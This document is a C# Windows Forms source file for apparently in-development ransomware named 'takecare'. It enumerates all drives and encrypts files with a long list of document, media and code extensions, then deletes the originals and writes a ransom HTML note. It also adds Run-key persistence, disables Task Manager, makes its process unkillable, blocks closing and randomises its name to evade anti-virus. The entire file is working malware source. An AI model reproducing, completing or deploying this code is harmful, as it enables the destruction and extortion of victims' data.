using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace takecare
{
    public partial class FrmMain : Form
    {
        private static readonly bool debug = Properties.Settings.Default.debug;
        private static readonly string defaultExtension = Properties.Settings.Default.extension;
        private static readonly string defaultMessage = Properties.Settings.Default.message;
        private enum CypherMode
        {
            Encode,
            Decode
        }

        // "skipPath" is experimental and currently working
        private readonly string[] skipPaths = new[]
        {
              "System32", "WinSxS", "Program Files", "System Volume Information"
        };

        private readonly string[] allowedExtensions = new[]
{
            ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav", ".pdf", ".raw", ".bat", ".json", ".doc", ".txt", ".png", ".cs", ".c", 
            ".java", ".h", ".rar", ".zip", ".7zip", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", 
            ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".xhtml", ".odt", ".ods", ".wma", ".wav", ".mpa", 
            ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico", ".asp", 
            ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
        };

        public FrmMain()
        {
            InitializeComponent();
        }

        public void Log(string text, string title)
        {
            try
            {
                if (File.Exists(Application.StartupPath + "\\log.txt"))
                {
                    string prefix = "[" + DateTime.Now + "] ";
                    File.AppendAllText(Application.StartupPath + "\\log.txt", prefix + text + Environment.NewLine);
                }
            } catch { }
        }

        private void RegisterStartup(bool isChecked)
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

                if (isChecked)
                {
                    registryKey.SetValue(Properties.Settings.Default.application_name, Application.ExecutablePath);
                }
                else
                {
                    registryKey.DeleteValue(Properties.Settings.Default.application_name);
                }
            }
            catch(Exception ex)
            {
                Log(ex.Message, "RegisterStartUp");
            }
        }

        private void Setup()
        {
            GenerateRandomApplicationName();
            GenerateKeys();
            ChangeProcessMode();
            ChangeTaskManagerAccess();
        }

        private void ChangeTaskManagerAccess()
        {
            try
            {
                if (Properties.Settings.Default.disable_taskmgr == true)
                {
                    MachineMananger.DisableTaskManager();
                    return;
                }

                MachineMananger.EnableTaskManager();
            }
            catch (Exception ex)
            {
                Log(ex.Message, "Form1_Load > ChangeTaskManagerAccess");
            }
        }

        private void GenerateKeys()
        {
            // Check if Encryption/Decryption Key was ever created on that machine
            if (Properties.Settings.Default.key.Length != 34)
            {
                Properties.Settings.Default.key = CryptoManager.GetRandomString(34);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                if (debug == true)
                {
                    WriteLine($@"Generated key: {Properties.Settings.Default.key}");
                }
            }
            else
            {
                if (debug == true)
                {
                    WriteLine($@"Key is: {Properties.Settings.Default.key}");
                }
            }
        }

        private void GenerateRandomApplicationName()
        {
            // Check if Application name is already set. If not, generate one
            // This should be random to try to be undetected from Anti-Virus
            if (Properties.Settings.Default.application_name.Length != 12)
            {
                Properties.Settings.Default.application_name = CryptoManager.GetRandomString(12);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                if (debug == true)
                {
                    if (debug == true)
                    {
                        WriteLine($@"Generated Application Name: {Properties.Settings.Default.application_name}");
                    }

                    Log($@"Generated Application Name: {Properties.Settings.Default.application_name}", "Form1_Load > Generate Application Name");
                }
            }
            else
            {
                if (debug == true)
                {
                    WriteLine($@"Key is: {Properties.Settings.Default.key}");
                }
            }
        }

        private void ChangeProcessMode()
        {
            if (Properties.Settings.Default.unkillable == true)
            {
                ProcessMananger.ProcessUnkillable();
                return;
            }

            ProcessMananger.ProcessKillable();
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            //Simple "Styling"
            //ShowInTaskbar = false;
            //ShowIcon = false;
            //Text = "";

            //Setup();

            //ChangePanelSettings();

            //ManangeDrives(CypherMode.Encode);
        }

        private void ChangePanelSettings()
        {
            lblTitle.Text = Properties.Settings.Default.application_title;
            lblTitle.Location = new Point(panel_main.Width / 2 - lblTitle.Width / 2, lblTitle.Location.Y);
            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
        }

        public void WriteLine(string text)
        {
            txtLog.AppendText($"{text}{Environment.NewLine}");
        }

        private void ChangeAllFiles(string path, CypherMode mode = CypherMode.Encode)
        {
            try
            {
                if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint)
                {
                    string newFilePath = string.Empty;
                    string defaultKey = Properties.Settings.Default.key;

                    foreach (string folder in GetValidDirectories(path))
                    {
                        foreach (string filePath in Directory.GetFiles(Path.GetFullPath(folder)))
                        {
                            string extension = Path.GetExtension(filePath);

                                switch (mode)
                                {
                                    case CypherMode.Encode:
                                        if (!IsValidExtension(extension)) break;

                                        newFilePath = FileManager.AddExtension(filePath, defaultExtension);

                                        CryptoManager.EncodeFile(filePath, newFilePath, defaultKey);

                                        WriteLine($@"Encrypted {filePath}");

                                        RemoveFile(filePath);
                                        break;

                                    case CypherMode.Decode:
                                        if (!FileManager.HasExtension(filePath, defaultExtension)) break;

                                        newFilePath = FileManager.RemoveExtension(filePath, defaultExtension);

                                        CryptoManager.DecodeFile(filePath, newFilePath, defaultKey);

                                        WriteLine($"Decrypted {filePath}");

                                        RemoveFile(filePath);
                                        break;

                                    default: throw new NotSupportedException();
                                }
                        }

                        ChangeAllFiles(folder);
                    }
                }
            }
            catch (Exception e)
            {
                WriteLine(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error");
            }
        }

        private bool IsValidExtension(string extension)
        {
            return allowedExtensions.Contains(extension.ToLower());
        }

        private IEnumerable<string> GetValidDirectories(string path)
        {
            return Directory.GetDirectories(path).Where(directory => !skipPaths.Contains(directory));
        }

        private void RemoveFile(string filePath)
        {
            try
            {
                File.Delete(filePath);
            }
            catch (Exception ex2)
            {
                WriteLine($"Cant delete file {ex2.Message}");
                Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
            }
        }

        private void ManangeDrives(CypherMode mode)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                ChangeDrive(drive, mode);
            }
        }

        private void ChangeDrive(DriveInfo drive, CypherMode mode)
        {
            WriteLine($@"Found drive {drive.Name}");
            Log($@"Found drive {drive.Name}", "GetFiles > Drive State Check");

            try
            {
                if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");

                ChangeAllFiles(drive.Name);

                FileManager.WriteHtmlFile(drive.Name, defaultMessage);

            }
            catch (Exception ex)
            {
                Log($@"Found drive {drive.Name} , but it's not ready.", "GetFiles > Drive State Check");
                WriteLine($@"Found drive {drive.Name}, but it's not ready.");
                Log($@"More information about the exception: {ex.Message}", "");
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void BtnDecrypt_Click(object sender, EventArgs e)
        {
            /*if(!string.IsNullOrEmpty(textBoxKey.Text.Trim()))
            {
                ManangeDrives(CypherMode.Decode);
            }*/
            GenerateKeys();
            ChangeAllFiles(@"D:\testDir");
            ChangeAllFiles(@"D:\testDir", CypherMode.Decode);
        }
    }
}
